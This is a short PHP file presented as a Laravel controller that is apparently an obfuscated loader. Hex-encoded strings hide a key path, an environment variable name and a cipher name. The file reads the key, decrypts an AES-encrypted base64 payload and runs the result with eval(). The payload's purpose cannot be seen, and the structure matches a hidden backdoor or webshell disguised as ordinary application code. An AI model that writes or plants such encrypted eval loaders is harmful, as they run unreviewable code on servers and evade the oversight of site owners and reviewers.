<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('9JsJdD4GE+IY5FtLR9bqPg==');

$c=base64_decode(

'B7BfSPZ2uiws+YxZB/w/sfr7zbfRbxSfPwuaf6ahfr9dbnMPLyj8MdClcgEZHJExb8k2/HYOGzCY' .
'W1mEZL6jKz1yjujKcwZW5YdaFGbRb98V6jQnGAnCVTKMlQRR3v7TBmrNsdvXiSCmQ6Pn93NT4WRm' .
'QZ81/j9UgxRsYm7l2nol3JDmilsdAhj8X10iJ2/EnY+UQMfY7uPj5hrYB1YChawDVbjXCTDgoqxz' .
'LS6Xtz/3bgoGxCpHD7Wv9ZQGrNHt'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

